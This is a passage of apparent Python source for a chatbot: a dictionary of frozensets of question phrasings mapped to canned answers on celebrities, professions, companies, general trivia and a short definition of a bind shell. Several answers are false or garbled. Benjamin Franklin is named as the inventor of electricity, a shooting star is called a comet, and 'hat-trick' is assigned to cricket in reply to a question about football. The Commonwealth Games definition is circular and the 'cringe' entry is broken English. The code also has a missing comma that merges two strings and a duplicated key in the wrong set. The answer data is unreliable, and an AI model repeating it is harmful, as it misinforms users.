        frozenset({
            "who is jennifer lopez",
            "who is jennifer lopez?",
            "tell me about jennifer lopez",
            "jennifer lopez biography",
            "who is jennifer lopez in real life"
        }): "Jennifer Lopez is an American singer, actress, dancer, and businesswoman. She gained fame for her roles in films like 'Selena' and for her hit songs like 'On The Floor' and 'Jenny from the Block.'",

        frozenset({
            "who is zayn malik",
            "who is zayn malik?",
            "tell me about zayn malik",
            "zayn malik biography",
            "who is zayn malik in real life"
        }): "Zayn Malik is an English singer and songwriter, known for being a member of the band One Direction. He later pursued a successful solo career with hits like 'Pillowtalk.'",

        frozenset({
            "who is angela merkel",
            "who is angela merkel?",
            "tell me about angela merkel",
            "angela merkel biography",
            "who is angela merkel in real life"
        }): "Angela Merkel is a German politician who served as Chancellor of Germany from 2005 to 2021. She was known for her leadership in the European Union and her influence on global politics.",

        frozenset({
            "who is kim kardashian",
            "who is kim kardashian?",
            "tell me about kim kardashian",
            "kim kardashian biography",
            "who is kim kardashian in real life"
        }): "Kim Kardashian is an American media personality, businesswoman, and socialite. She gained fame through the reality TV show Keeping Up with the Kardashians and has built a successful brand in fashion, beauty, and social media.",

        frozenset({
            "who is will smith",
            "who is will smith?",
            "tell me about will smith",
            "will smith biography",
            "who is will smith in real life"
        }): "Will Smith is an American actor, producer, and rapper known for his roles in movies like Men in Black, The Pursuit of Happyness, and Independence Day. He has been a prominent figure in both television and film.",

        frozenset({
            "who is oprah winfrey",
            "who is oprah winfrey?",
            "tell me about oprah winfrey",
            "oprah winfrey biography",
            "who is oprah winfrey in real life"
        }): "Oprah Winfrey is an American talk show host, media mogul, and philanthropist. She became a global icon through The Oprah Winfrey Show and has been influential in promoting social causes and self-improvement.",

        frozenset({
            "who is rihanna",
            "who is rihanna?",
            "tell me about rihanna",
            "rihanna biography",
            "who is rihanna in real life"
        }): "Rihanna is a Barbadian singer, songwriter, and entrepreneur. Known for her hit songs and bold fashion choices, she has expanded her brand with her cosmetics and fashion line, Fenty.",

        frozenset({
            "who is justin bieber",
            "who is justin bieber?",
            "tell me about justin bieber",
            "justin bieber biography",
            "who is justin bieber in real life"
        }): "Justin Bieber is a Canadian singer and songwriter who rose to fame with hits like 'Baby' and 'Sorry.' He has been a major influence in pop music and has a massive global fanbase.",

        frozenset({
            "who is serena williams",
            "who is serena williams?",
            "tell me about serena williams",
            "serena williams biography",
            "who is serena williams in real life"
        }): "Serena Williams is an American professional tennis player, considered one of the greatest athletes of all time. She has won numerous Grand Slam titles and is known for her powerful playing style and advocacy for women’s sports.",

        frozenset({
            "who is kendall jenner",
            "who is kendall jenner?",
            "tell me about kendall jenner",
            "kendall jenner biography",
            "who is kendall jenner in real life"
        }): "Kendall Jenner is an American supermodel and television personality, known for being part of the Kardashian-Jenner family and for her successful modeling career with major fashion brands.",

        frozenset({
            "who is dwayne johnson",
            "who is dwayne johnson?",
            "tell me about dwayne johnson",
            "dwayne johnson biography",
            "who is dwayne johnson in real life"
        }): "Dwayne 'The Rock' Johnson is an American actor, producer, and former professional wrestler. Known for his roles in the Fast & Furious series and his wrestling career, he has become one of Hollywood’s highest-paid actors.",

        frozenset({
            "who is adele",
            "who is adele?",
            "tell me about adele",
            "adele biography",
            "who is adele in real life"
        }): "Adele is a British singer and songwriter known for her soulful voice and hits like 'Someone Like You' and 'Hello.' She has won multiple Grammy Awards and is renowned for her emotional ballads.",

        frozenset({
            "who is brad pitt",
            "who is brad pitt?",
            "tell me about brad pitt",
            "brad pitt biography",
            "who is brad pitt in real life"
        }): "Brad Pitt is an American actor and producer, known for his roles in films like Fight Club, World War Z, and Once Upon a Time in Hollywood. He is regarded as one of Hollywood's most talented and influential actors.",

        frozenset({
            "what is a software engineer",
            "define software engineer",
            "what does a software engineer do",
            "what does a software engineer work on",
            "explain software engineering"
        }): "A software engineer is a professional who designs, develops, and maintains software applications and systems. They work with programming languages and various tools to solve problems through technology.",

        frozenset({
            "what is a data scientist",
            "define data scientist",
            "what does a data scientist do",
            "what does a data scientist work on",
            "explain data science"
        }): "A data scientist analyzes large amounts of data to uncover patterns and insights that can help make business decisions. They often use statistical methods, machine learning, and data visualization techniques.",

        frozenset({
            "what is a web developer",
            "define web developer",
            "what does a web developer do",
            "what does a web developer work on",
            "explain web development"
        }): "A web developer builds and maintains websites or web applications, using programming languages like HTML, CSS, JavaScript, and various frameworks to create user-friendly interfaces and functionality.",

        frozenset({
            "what is a graphic designer",
            "define graphic designer",
            "what does a graphic designer do",
            "what does a graphic designer work on",
            "explain graphic design"
        }): "A graphic designer creates visual content for digital and print media, such as logos, brochures, websites, and advertisements. They use design software to communicate messages through images, typography, and layout.",

        frozenset({
            "what is a doctor",
            "define doctor",
            "what does a doctor do",
            "what does a doctor work on",
            "explain medical profession"
        }): "A doctor is a medical professional who diagnoses and treats illnesses, injuries, and other health conditions. They may specialize in areas like surgery, pediatrics, or cardiology.",

        frozenset({
            "what is a lawyer",
            "define lawyer",
            "what does a lawyer do",
            "what does a lawyer work on",
            "explain law profession"
        }): "A lawyer provides legal advice and representation to clients in various legal matters. They may work in areas like criminal law, civil law, or corporate law, and often represent clients in court.",

        frozenset({
            "what is a teacher",
            "define teacher",
            "what does a teacher do",
            "what does a teacher work on",
            "explain teaching profession"
        }): "A teacher is an educator who imparts knowledge and skills to students in schools, colleges, or universities. They may teach specific subjects and use various methods to facilitate learning.",

        frozenset({
            "what is a nurse",
            "define nurse",
            "what does a nurse do",
            "what does a nurse work on",
            "explain nursing profession"
        }): "A nurse is a healthcare professional who provides patient care, support, and education. They work alongside doctors to monitor patients' health and assist with medical treatments.",

        frozenset({
            "what is a photographer",
            "define photographer",
            "what does a photographer do",
            "what does a photographer work on",
            "explain photography profession"
        }): "A photographer captures visual images using cameras, often for artistic, commercial, or journalistic purposes. They may specialize in portrait, landscape, or event photography.",

        frozenset({
            "what is a chef",
            "define chef",
            "what does a chef do",
            "what does a chef work on",
            "explain culinary profession"
        }): "A chef is a professional cook who is skilled in preparing food. They may work in restaurants, hotels, or catering businesses and oversee kitchen operations, menu planning, and food preparation.",

        frozenset({
            "what is a pharmacist",
            "define pharmacist",
            "what does a pharmacist do",
            "what does a pharmacist work on",
            "explain pharmacy profession"
        }): "A pharmacist is a healthcare professional who dispenses medications and provides advice on their proper use. They also work to ensure the safety and effectiveness of prescribed treatments.",

        frozenset({
            "what is an accountant",
            "define accountant",
            "what does an accountant do",
            "what does an accountant work on",
            "explain accounting profession"
        }): "An accountant manages financial records and transactions, prepares financial reports, and ensures compliance with regulations. They work in various industries to track income, expenses, and taxes.",

        frozenset({
            "what is a scientist",
            "define scientist",
            "what does a scientist do",
            "what does a scientist work on",
            "explain scientific profession"
        }): "A scientist conducts research and experiments to expand knowledge in fields like biology, chemistry, physics, or environmental science. They analyze data, test theories, and contribute to scientific advancements.",

        frozenset({
            "what is an engineer",
            "define engineer",
            "what does an engineer do",
            "what does an engineer work on",
            "explain engineering profession"
        }): "An engineer applies scientific principles to design, build, and maintain structures, machines, or systems. They work in various fields such as civil, mechanical, electrical, and software engineering.",

        frozenset({
            "what is a journalist",
            "define journalist",
            "what does a journalist do",
            "what does a journalist work on",
            "explain journalism profession"
        }): "A journalist collects, writes, and reports news and information for newspapers, TV, websites, or magazines. They investigate stories, conduct interviews, and deliver reports to the public.",

        frozenset({
            "what is an architect",
            "define architect",
            "what does an architect do",
            "what does an architect work on",
            "explain architecture profession"
        }): "An architect designs buildings and structures, ensuring they are functional, aesthetically pleasing, and structurally sound. They work with clients, engineers, and contractors to create architectural plans.",

        frozenset({
            "what is a mechanic",
            "define mechanic",
            "what does a mechanic do",
            "what does a mechanic work on",
            "explain mechanic profession"
        }): "A mechanic is a skilled tradesperson who repairs and maintains vehicles or machinery. They work on engines, brakes, transmissions, and other mechanical systems to ensure proper functioning.",

        frozenset({
            "what is nike",
            "what is nike inc",
            "what is nike company",
            "define nike",
            "explain nike",
            "who owns nike",
            "who founded nike"
        }): "Nike Inc. is an American multinational corporation that designs, manufactures, and markets athletic footwear, apparel, and sports equipment, known for its iconic 'swoosh' logo and 'Just Do It' slogan.",

        frozenset({
            "what is coca-cola",
            "what is coca cola",
            "what is coca cola company",
            "what is coca-cola company",
            "define coca-cola",
            "define coca cola",
            "explain coca cola",
            "explain coca-cola",
            "who owns coca-cola",
            "who founded coca-cola"
        }): "Coca-Cola is an American multinational beverage corporation, famous for its soft drinks, primarily the Coca-Cola soda, and a range of other drinks like Sprite and Fanta.",

        frozenset({
            "what is twitter",
            "what is twitter inc",
            "what is twitter company",
            "define twitter",
            "explain twitter",
            "who owns twitter",
            "who founded twitter"
        }): "Twitter, now rebranded as X, is an American social media platform known for its microblogging service where users post short updates, known as tweets, and interact with others in real-time.",

        frozenset({
            "what is uber",
            "what is uber technologies",
            "what is uber company",
            "define uber",
            "explain uber",
            "who owns uber",
            "who founded uber"
        }): "Uber Technologies Inc. is an American multinational ride-hailing company that connects passengers with drivers through a mobile app, also involved in food delivery (Uber Eats) and self-driving technologies.",

        frozenset({
            "what is adobe",
            "what is adobe inc",
            "what is adobe company",
            "define adobe",
            "explain adobe",
            "who owns adobe",
            "who founded adobe"
        }): "Adobe Inc. is an American multinational computer software company, known for products like Photoshop, Illustrator, Acrobat, and Premiere, which are widely used in graphic design, video editing, and document management.",

        frozenset({
            "what is gen alpha",
            "what is gen-alpha",
            "what is gen alpha?",
            "what is gen-alpha?",
            "explain gen alpha",
            "explain gen-alpha",
            "define gen-alpha",
            "define gen alpha",
            "who are gen alpha",
            "who are gen-alpha"
        }): "Generation Alpha (Gen Alpha) includes those born from 2013 onwards. They are growing up in a fully digital world and are expected to be the most tech-reliant generation yet.",

        frozenset({
            "what is spotify",
            "what is spotify inc",
            "what is spotify company",
            "define spotify",
            "explain spotify",
            "who owns spotify",
            "who founded spotify"
        }): "Spotify is a Swedish music streaming service that allows users to listen to millions of songs, podcasts, and videos from artists worldwide, offering both free and premium subscriptions.",

        frozenset({
            "what is airbnb",
            "what is airbnb inc",
            "what is airbnb company",
            "define airbnb",
            "explain airbnb",
            "who owns airbnb",
            "who founded airbnb"
        }): "Airbnb is an American online marketplace that connects people looking for accommodations with hosts offering short-term rentals, including homes, apartments, and unique properties.",

        frozenset({
            "what is whatsapp",
            "what is whatsapp inc",
            "what is whatsapp company",
            "define whatsapp",
            "explain whatsapp",
            "who owns whatsapp",
            "who founded whatsapp"
        }): "WhatsApp is an American messaging application owned by Meta (formerly Facebook), allowing users to send text messages, voice messages, make calls, and share multimedia over the internet.",

        frozenset({
            "what is zoom",
            "what is zoom video communications",
            "what is zoom company",
            "define zoom",
            "explain zoom",
            "who owns zoom",
            "who founded zoom"
        }): "Zoom Video Communications is an American company that provides video conferencing, online meetings, and collaboration software for businesses and individuals.",

        frozenset({
            "what is slack",
            "what is slack technologies",
            "what is slack company",
            "define slack",
            "explain slack",
            "who owns slack",
            "who founded slack"
        }): "Slack Technologies, acquired by Salesforce, offers a collaboration and messaging platform for teams, providing channels for communication, file sharing, and integration with other productivity tools.",

        frozenset({
            "what is snapchat",
            "what is snapchat inc",
            "what is snapchat company",
            "define snapchat",
            "explain snapchat",
            "who owns snapchat",
            "who founded snapchat"
        }): "Snapchat is an American multimedia messaging app known for its short-lived, disappearing messages and features like Stories, lenses, and Discover content.",

        frozenset({
            "what is linkedin",
            "what is linkedin corp",
            "what is linkedin company",
            "define linkedin",
            "explain linkedin",
            "who owns linkedin",
            "who founded linkedin"
        }): "LinkedIn is a professional networking platform owned by Microsoft, where users can create profiles, connect with colleagues, and explore career opportunities.",

        frozenset({
            "what is walmart",
            "what is walmart inc",
            "what is walmart company",
            "define walmart",
            "explain walmart",
            "who owns walmart",
            "who founded walmart"
        }): "Walmart Inc. is an American multinational retail corporation that operates a chain of hypermarkets, discount department stores, and grocery stores worldwide.",

        frozenset({
            "what is huawei",
            "what is huawei technologies",
            "what is huawei company",
            "define huawei",
            "explain huawei",
            "who owns huawei",
            "who founded huawei"
        }): "Huawei Technologies is a Chinese multinational technology company known for designing and manufacturing telecommunications equipment, consumer electronics, and smartphones.",

        frozenset({
            "what is dell",
            "what is dell inc",
            "what is dell company",
            "define dell",
            "explain dell",
            "who owns dell",
            "who founded dell"
        }): "Dell Technologies is an American multinational corporation that develops, sells, repairs, and supports computers and related products and services, known for its laptops and desktops.",

        frozenset({
            "what is hp",
            "what is hp inc",
            "what is hp company",
            "define hp",
            "explain hp",
            "who owns hp",
            "who founded hp"
        }): "HP Inc. (Hewlett-Packard) is an American multinational information technology company known for its printers, computers, and other related hardware and software products.",

        frozenset({
            "what is lenovo",
            "what is lenovo company",
            "define lenovo",
            "explain lenovo",
            "who owns lenovo",
            "who founded lenovo"
        }): "Lenovo is a Chinese multinational technology company that designs, manufactures, and markets computers, tablets, smartphones, and other electronics, with popular products like ThinkPad laptops.",

        frozenset({
            "what is capcom",
            "what is capcom company",
            "define capcom",
            "explain capcom",
            "who owns capcom",
            "who founded capcom"
        }): "Capcom is a Japanese video game developer and publisher known for creating popular franchises such as Street Fighter, Resident Evil, and Monster Hunter.",

        frozenset({
            "what is rockstar",
            "what is rockstar games",
            "define rockstar",
            "explain rockstar",
            "who owns rockstar",
            "who founded rockstar"
        }): "Rockstar Games is an American video game publisher and developer, best known for creating the Grand Theft Auto and Red Dead Redemption series.",

        frozenset({
            "what is playstation",
            "what is playstation company",
            "define playstation",
            "explain playstation",
            "who owns playstation",
            "who founded playstation"
        }): "PlayStation is a video game brand developed and owned by Sony Interactive Entertainment, known for its consoles like the PlayStation 5, PlayStation 4, and the games that are exclusive to the platform.",

        frozenset({
            "what is nintendo",
            "what is nintendo company",
            "define nintendo",
            "explain nintendo",
            "who owns nintendo",
            "who founded nintendo"
        }): "Nintendo is a Japanese multinational consumer electronics and video game company, known for creating iconic franchises like Super Mario, The Legend of Zelda, and Pokémon.",

        frozenset({
            "what is microsoft",
            "what is microsoft corporation",
            "define microsoft",
            "explain microsoft",
            "who owns microsoft",
            "who founded microsoft"
        }): "Microsoft Corporation is an American multinational technology company known for software products like Windows, Office, and Xbox consoles, as well as cloud services like Azure.",

        frozenset({
            "what is activision",
            "what is activision company",
            "define activision",
            "explain activision",
            "who owns activision",
            "who founded activision"
        }): "Activision is an American video game publisher known for its Call of Duty franchise, as well as games like Crash Bandicoot and Tony Hawk's Pro Skater.",

        frozenset({
            "what is ea",
            "what is electronic arts",
            "define ea",
            "explain ea",
            "who owns ea",
            "who founded ea"
        }): "Electronic Arts (EA) is an American video game company known for developing and publishing popular franchises such as The Sims, FIFA, Madden NFL, and Battlefield.",

        frozenset({
            "what is bethesda",
            "what is bethesda softworks",
            "define bethesda",
            "explain bethesda",
            "who owns bethesda",
            "who founded bethesda"
        }): "Bethesda Softworks is an American video game publisher known for publishing popular franchises like The Elder Scrolls, Fallout, and Doom.",

        frozenset({
            "what is cringe",
            "what is cringe",
            "explain cringe",
            "explain cringe?",
            "define cringe",
            "define cringe",
            "what does cringe mean",
            "what does cringe mean?"
        }): "cringe mean is very embarrassing, because of being so bad or silly",

        frozenset({
            "name the largest planet of our solar system?",
            "what is the largest planet in the solar system",
            "largest planet in our solar system"
        }): "Jupiter.",

        frozenset({
            "how many letters are there in the english alphabet?",
            "number of letters in the english alphabet",
            "how many letters in english alphabet",
            "how many letters are there in english alphabet",
            "total number of letters in english alphabet"
        }): "26 letters",

        frozenset({
            "what is sega",
            "what is sega corporation",
            "define sega",
            "explain sega",
            "who owns sega",
            "who founded sega"
        }): "Sega is a Japanese multinational video game developer and publisher, known for creating franchises like Sonic the Hedgehog, Yakuza, and Phantasy Star.",

        frozenset({
            "what is ubisoft",
            "what is ubisoft entertainment",
            "define ubisoft",
            "explain ubisoft",
            "who owns ubisoft",
            "who founded ubisoft"
        }): "Ubisoft is a French video game company known for creating major franchises like Assassin's Creed, Far Cry, Rainbow Six, and Watch Dogs.",

        frozenset({
            "what is nvidia",
            "what is nvidia corporation",
            "define nvidia",
            "explain nvidia",
            "who owns nvidia",
            "who founded nvidia"
        }): "Nvidia is an American technology company known for designing graphics processing units (GPUs) for gaming, AI, and deep learning, as well as for creating technology like the Nvidia Shield and Tesla computing systems.",

        frozenset({
            "what is riot games",
            "what is riot games inc",
            "define riot games",
            "explain riot games",
            "who owns riot games",
            "who founded riot games"
        }): "Riot Games is an American video game developer, best known for its popular game League of Legends and its other games like Valorant.",

        frozenset({
            "what is bandai namco",
            "what is bandai namco entertainment",
            "define bandai namco",
            "explain bandai namco",
            "who owns bandai namco",
            "who founded bandai namco"
        }): "Bandai Namco Entertainment is a Japanese multinational video game company known for franchises like Pac-Man, Tekken, and Dragon Ball.",

        frozenset({
            "what is xbox",
            "what is xbox company",
            "define xbox",
            "explain xbox",
            "who owns xbox",
            "who founded xbox"
        }): "Xbox is a gaming brand created by Microsoft, known for its consoles (Xbox One, Xbox Series X/S), exclusive games, and online gaming services like Xbox Live.",

        frozenset({
            "what is blizzard",
            "what is blizzard entertainment",
            "define blizzard",
            "explain blizzard",
            "who owns blizzard",
            "who founded blizzard"
        }): "Blizzard Entertainment is an American video game developer and publisher known for creating games like World of Warcraft, Diablo, StarCraft, and Overwatch.",

        frozenset({
            "what is square enix",
            "what is square enix holdings",
            "define square enix",
            "explain square enix",
            "who owns square enix",
            "who founded square enix"
        }): "Square Enix is a Japanese video game company best known for its role-playing game franchises such as Final Fantasy, Kingdom Hearts, and Dragon Quest.",

        frozenset({
            "what is take-two interactive",
            "what is take-two interactive software",
            "define take-two interactive",
            "explain take-two interactive",
            "who owns take-two interactive",
            "who founded take-two interactive"
        }): "Take-Two Interactive is an American video game publisher known for publishing Rockstar Games titles like Grand Theft Auto and 2K Games franchises like NBA 2K.",

        frozenset({
            "what is valve",
            "what is valve corporation",
            "define valve",
            "explain valve",
            "who owns valve",
            "who founded valve"
        }): "Valve Corporation is an American video game developer and digital distribution company, known for creating games like Half-Life, Portal, and Dota 2, as well as for operating the Steam platform.",

        frozenset({
            "what is epic games",
            "what is epic games inc",
            "define epic games",
            "explain epic games",
            "who owns epic games",
            "who founded epic games"
        }): "Epic Games is an American video game company known for developing Fortnite, as well as creating the Unreal Engine for game development and publishing games like Gears of War.",
                
        frozenset({
            "who invented electricity?",
            "who is the inventor of electricity",
            "electricity inventor"
        }): "Benjamin Franklin.",

        frozenset({
            "name a natural satellite of earth?",
            "natural satellite of earth",
            "what is the natural satellite of earth"
        }): "Moon.",

        frozenset({
            "34 teeth in total adults have.",
            "adults have 34 teeth in total",
            "how many teeth do adults have?",
            "how many teeth are there in an adult's mouth?"
        }): "The adult has 32 teeth in total",

        frozenset({
            "who was the first president of the united states?",
            "first president of the united states?",
            "name the first president of the united states",
            "who is the first president of america?"
        }): "George Washington",

        frozenset({
            "how many planets are there in our solar system?",
            "number of planets in our solar system",
            "planets in our solar system count",
            "how many planets in the solar system?"
        }): "Eight",

        frozenset({
            "who invented the telephone?",
            "who is the inventor of the telephone?",
            "who created the telephone?",
            "telephone invention by?"
        }): "Alexander Graham Bell",

        frozenset({
            "which planet is known as the 'morning star' or the 'evening star'?",
            "morning star and evening star planet?",
            "planet called morning star or evening star",
            "which planet is referred to as morning star?"
        }): "Venus",

        frozenset({
            "what is the tallest animal in the world?",
            "name the tallest animal in the world",
            "tallest animal?",
            "which is the tallest animal?"
        }): "Giraffe",

        frozenset({
            "who discovered the law of motion?",
            "who is the scientist behind the law of motion?",
            "discovered law of motion?",
            "who formulated the laws of motion?"
        }): "Isaac Newton",

        frozenset({
            "what is the largest island in the world?",
            "name the largest island in the world",
            "largest island on earth",
            "biggest island in the world?"
        }): "Greenland",

        frozenset({
            "who is known as the 'mother of indian revolution'?",
            "who is called the 'mother of indian revolution'?",
            "mother of indian revolution",
            "who is the mother of the indian revolution?"
        }): "Bhikaji Cama",

        frozenset({
            "what is the national currency of the united kingdom?",
            "currency of the united kingdom",
            "uk national currency?",
            "what is the official currency of the uk?"
        }): "Pound Sterling",

        frozenset({
            "what is the largest desert in the world?",
            "name the largest desert",
            "biggest desert on earth",
            "largest desert?"
        }): "Sahara Desert",

        frozenset({
            "what is the chemical symbol for gold?",
            "chemical symbol for gold",
            "gold symbol",
            "what does gold symbol look like?"
        }): "Au",

        frozenset({
            "who was the first woman to win a nobel prize?",
            "name the first woman to win a nobel prize",
            "first woman to win the nobel prize",
            "who won the first nobel prize as a woman?"
        }): "Marie Curie",

        frozenset({
            "what is the tallest waterfall in the world?",
            "name the tallest waterfall",
            "biggest waterfall in the world",
            "what is the tallest waterfall?"
        }): "Angel Falls",

        frozenset({
            "which is the longest river in asia?",
            "longest river in asia?",
            "name the longest river in asia",
            "what is asia's longest river?"
        }): "The Yangtze River",

        frozenset({
            "what is the main ingredient in guacamole?",
            "main ingredient of guacamole",
            "guacamole's main ingredient",
            "guacamole made with?"
        }): "Avocado",

        frozenset({
            "which animal is known for its ability to fly?",
            "name the animal known for flying",
            "flying animal",
            "which animal can fly?"
        }): "Bat",

        frozenset({
            "who painted the sistine chapel ceiling?",
            "name the artist who painted the sistine chapel ceiling",
            "sistine chapel ceiling artist",
            "who is the painter of sistine chapel?"
        }): "Michelangelo",

        frozenset({
            "what is the largest volcano in the world?",
            "name the largest volcano",
            "biggest volcano",
            "largest volcano on earth?"
        }): "Mauna Loa",

        frozenset({
            "which planet is known as the 'giant red spot' planet?",
            "planet with giant red spot",
            "which planet has the giant red spot?",
            "what planet is called the giant red spot planet?"
        }): "Jupiter",

        frozenset({
            "a barometer is used to measure atmospheric pressure.",
            "what does a barometer measure?",
            "what is measured by a barometer",
            "barometer measures what?"
        }): "A barometer is used to measure Atmospheric Pressure",

        frozenset({
            "valentina tereshkova was the first woman to go into space.",
            "who was the first woman to go into space?",
            "who is the first woman to go into space"
        }): "Valentina Tereshkova was the first woman to go into space",

        frozenset({
            "sparrow is a bird known for its intelligence.",
            "which bird is known for its intelligence?",
            "what bird is known for its intelligence"
        }): "Owl is known for its intelligence",

        frozenset({
            "europe is the second smallest continent and the third most populous continent",
            "what is europe's rank in size and population?",
            "europe's size and population rank?"
        }): "Europe is the second smallest continent and the third most populous continent",

        frozenset({
            "bosnia and herzegovina's largest city and capital is sarajevo.",
            "what is the capital of bosnia and herzegovina?",
            "capital of bosnia and herzegovina?"
        }): "Bosnia and Herzegovina's largest city and capital is Sarajevo",

        frozenset({
            "plants absorb oxygen?",
            "do plants absorb oxygen?",
            "does plant absorb oxygen"
        }): "Plants absorb Carbon Dioxide",

        frozenset({
            "denmark's capital and most populous city is copenhagen",
            "what is the capital of denmark?",
            "denmark capital and populous city?"
        }): "Denmark's capital and most populous city is Copenhagen",

        frozenset({
            "half of 250 is 125.",
            "what is half of 250?",
            "half of 250?"
        }): "Half of 250 is 125",

        frozenset({
            "meter per second is the unit of speed.",
            "what is the unit of speed?",
            "speed is measured in?"
        }): "Meter per second is the unit of Speed",

        frozenset({
            "william shakespeare is a scientist.",
            "was william shakespeare a scientist?",
            "was william shakespeare a scientist or poet?"
        }): "William Shakespeare was an English dramatist, poet, and actor",

        frozenset({
            "there are 200 bones in the human body.",
            "how many bones are there in the human body?",
            "how many bones in human body?"
        }): "There are 206 bones in the Human Body",

        frozenset({
            "electrons are larger than molecules.",
            "are electrons larger than molecules?",
            "do electrons have more size than molecules?"
        }): "Electrons are smaller than molecules",

        frozenset({
            "with the help of photosynthesis plants make their own food.",
            "do plants make their own food through photosynthesis?",
            "plants make food through?"
        }): "With the help of Photosynthesis plants make their own food",

        frozenset({
            "chemical formulae of hydrochloric acid is hcl.",
            "what is the chemical formula of hydrochloric acid?",
            "chemical formula for hcl?"
        }): "Chemical formulae of Hydrochloric acid is HCl",

        frozenset({
            "there are 11 players in a cricket team.",
            "how many players are there in a cricket team?",
            "how many players cricket team?"
        }): "There are 11 players in a cricket team",

        frozenset({
            "in 1916 olympic games were cancelled because of world war i?",
            "why were the 1916 olympic games cancelled?",
            "reason for cancellation of 1916 olympics?"
        }): "In 1916 Olympic Games were cancelled because of World War I",

        frozenset({
            "in football, the term hat-trick is used.",
            "is the term 'hat-trick' used in football?",
            "what sport uses the term hat-trick?"
        }): "The term Hat-Trick is used in cricket",

        frozenset({
            "there are nine players in one team of kho kho.",
            "how many players are there in a kho kho team?",
            "how many players in kho kho?"
        }): "There are nine players in one team of Kho Kho",

        frozenset({
            "commonwealth games are held every four years.",
            "how often are the commonwealth games held?",
            "commonwealth games frequency?"
        }): "Commonwealth Games are held every four years",

        frozenset({
            "a rainbow has five colours.",
            "how many colours are in a rainbow?",
            "how many colours in a rainbow?"
        }): "Rainbow has 7 colours (VIBGYOR)",

        frozenset({
            "the main function of the xylem is to transport water from roots to stems and leaves.",
            "what does the xylem do?",
            "xylem function?"
        }): "The main function of the xylem is to transport water from roots to stems and leaves",

        frozenset({
            "world turtle day is observed on may 23 annually.",
            "when is world turtle day?",
            "date of world turtle day?"
        }): "World Turtle Day is observed on May 23 annually",

        frozenset({
            "india is a democratic country?",
            "is india a democratic country?",
            "india is a democracy?"
        }): "India is a democratic country",

        frozenset({
            "world cup is held after every 3 years.",
            "how often is the world cup held?",
            "how often does world cup occur?"
        }): "World Cup is held every 4 years",

        frozenset({
            "tiger belongs to the family of cats.",
            "does a tiger belong to the cat family?",
            "is tiger a member of the cat family?"
        }): "Tiger belongs to the family of cats",

        frozenset({
            "what is the largest planet in our solar system?",
            "which is the largest planet in our solar system?",
            "largest planet?"
            "tell me largest planet name"
        }): "Jupiter",

        frozenset({
            "what is a shooting star?",
            "what is a shooting star?",
            "shooting star meaning?"
        }): "A comet entering Earth's atmosphere",

        frozenset({
            "which planet is known for its beautiful rings?",
            "which planet has beautiful rings?",
            "planet with beautiful rings?"
        }): "Saturn",

        frozenset({
            "what causes the phases of the moon?",
            "what causes the moon's phases?",
            "why does the moon have phases?",
            "what causes the phases of the moon",
            "what causes the moon's phases",
            "why does the moon have phases"
        }): "Sun's Light",

        frozenset({
            "what is the name of the closest star to earth?",
            "which star is closest to earth?",
            "name of the closest star to earth?",
            "what is the name of the closest star to earth",
            "which star is closest to earth",
            "name of the closest star to earth"
        }): "Sun",

        frozenset({
            "what is the launch date for chandrayaan 3 mission?",
            "when was chandrayaan 3 launched?",
            "launch date of chandrayaan 3?",
            "chandrayaan 3 launch date",
            "chandrayaan 3 launch date?"
        }): "July 14, 2023",

        frozenset({
            "what is the mission of chandrayaan 3?",
            "what is the goal of the chandrayaan 3 mission?",
            "purpose of chandrayaan 3?"
        }): "To demonstrate a safe and soft landing on the lunar surface",

        frozenset({
            "is chandrayaan-3 a follow up mission of chandrayaan-2?",
            "is chandrayaan 3 a follow-up to chandrayaan 2?",
            "is chandrayaan 3 a sequel to chandrayaan 2?",
            "is chandrayaan-3 a follow up mission of chandrayaan-2",
            "is chandrayaan 3 a follow-up to chandrayaan 2",
            "is chandrayaan 3 a sequel to chandrayaan 2"
        }): "Chandrayaan-3 is a follow-up mission of Chandrayaan-2",


        frozenset({
            "what are commonwealth games?",
            "commonwealth games",
            "what is the commonwealth games",
            "define commonwealth games",
            "what is commonwealth games",
            "what is the commonwealth games?"
        }): "The Commonwealth Games are a quadrennial international multi-sport event among the athletes of the Commonwealth Games.",

        frozenset({
            "how many years of independence india celebrated on august 15, 2024?",
            "years of independence india celebrated on august 15, 2024",
            "how many years of independence india celebrated in 2024"
        }): "India celebrated 77 years of Independence on August 15, 2024.",

        frozenset({
            "how many medals india won in the commonwealth games 2022?",
            "how many medals did india win in the commonwealth games 2022",
            "india's medals in commonwealth games 2022"
        }): "India won total 61 medals in Commonwealth Games 2022.",

        frozenset({
            "what is the smallest country in the world by land area?",
            "smallest country by land area",
            "smallest country in the world"
        }): "Vatican City.",

        frozenset({
            "who discovered penicillin?",
            "penicillin discoverer",
            "who is the discoverer of penicillin"
        }): "Alexander Fleming.",

        frozenset({
            "what is japan's currency?",
            "currency of japan",
            "what is the currency of japan",
            "what is japan's currency",
            "currency of japan",
            "what is the currency of japan",
            "japan currency",
        }): "Yen.",

        frozenset({
            "what is china's currency?",
            "currency of china",
            "what is the currency of china?",
            "what is the currency of china",
            "china currency",
            "currency of china?",
        }): "Yuan.",

        frozenset({
            "what is south korea's currency?",
            "currency of south korea",
            "what is the currency of south korea",
            "what is the currency of south korea?",
            "china currency",
            "currency of south korea?",
        }): "Won.",

        frozenset({
            "in which year did the titanic sink?",
            "titanic sinking year",
            "when did the titanic sink",
            "in which year the titaic sink?",
            "in which year the titaic sink"
        }): "1912.",

        frozenset({
            "what is bind shell",
            "explain bind shell",
            "what is bind shell?",
            "define bind shell"
        }): "A bind shell is a technique where the target system opens and listens on a specific port, waiting for an attacker to connect. Once the attacker connects to that port, they gain remote access to the system and can execute commands as if they were physically using it. This allows the attacker to control the system remotely through the open port.",

        frozenset({
            "what is the hardest natural substance on earth?",
            "hardest natural substance",
            "what is the hardest natural substance",
            "hardest natural substance?",
            "what is the hardest natural substance?",
            "what is the hardest natural substance on earth",
        }): "Diamond.",

        frozenset({
            "which is the longest river in south america?",
            "longest river in south america",
            "what is the longest river in south america",
            "longest river in south america?"
        }): "The Amazon River (6,400 km).",

        frozenset({
            "longest river in the world?",
            "longest river in the world",
            "what is the longest river in the world"
        }): "Nile River (6,650 km).",

        frozenset({
            "who is known as the father of modern physics?",
            "father of modern physics",
            "who is the father of modern physics"
        }): "Albert Einstein.",

        frozenset({
            "what is the largest organ in the human body?",
            "largest organ in human body",
            "what is the largest human organ"
        }): "The skin.",

        frozenset({
            "what is the capital of japan?",
            "capital of japan",
            "which city is the capital of japan"
        }): "Tokyo.",

        frozenset({
            "what is the capital of germany?",
            "capital of germany",
            "which city is the capital of germany"
        }): "Berlin.",

        frozenset({
            "most amazing world records",
            "top Guinness world records",
            "strangest Guinness records",
            "Guinness world records list"
